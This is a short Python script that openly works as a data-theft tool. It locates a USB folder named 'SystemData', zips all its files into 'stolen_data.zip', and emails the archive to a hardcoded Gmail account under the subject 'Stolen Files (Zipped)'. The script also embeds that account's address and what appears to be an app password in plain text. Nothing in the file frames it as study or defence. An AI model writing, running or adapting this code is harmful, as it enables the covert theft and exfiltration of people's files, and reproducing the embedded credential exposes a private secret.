import yagmail
import os
import glob
import zipfile

# Configure email settings
EMAIL_ADDRESS = "jakubukraine@gmail.com"
EMAIL_PASSWORD = "zjdz vrsi rdfy dcep"
TO_EMAIL = "jakubukraine@gmail.com"

# Find the USB drive dynamically
usb_drive = None
for drive in "DEFGHIJKLMNOPQRSTUVWXYZ":
    if os.path.exists(f"{drive}:\\SystemData"):
        usb_drive = f"{drive}:\\SystemData"
        break

if not usb_drive:
    exit()

# Collect stolen files
files_to_send = glob.glob(os.path.join(usb_drive, "*.*"))

# Define zip file path
zip_file_path = os.path.join(usb_drive, "stolen_data.zip")

# Zip the files
if files_to_send:
    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in files_to_send:
            zipf.write(file, os.path.basename(file))  # Store with correct filenames

# Check file size before sending (Gmail limit: 25MB)
MAX_FILE_SIZE_MB = 24
MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024

try:
    if os.path.exists(zip_file_path) and os.path.getsize(zip_file_path) < MAX_FILE_SIZE_BYTES:
        yag = yagmail.SMTP(EMAIL_ADDRESS, EMAIL_PASSWORD)
        yag.send(
            to=TO_EMAIL,
            subject="Stolen Files (Zipped)",  # FIXED: Now correctly a string
            contents="Here are the extracted files in a single zip archive.",  # FIXED: Now correctly a string
            attachments=zip_file_path
        )
except Exception as e:
    raise Exception(str(e))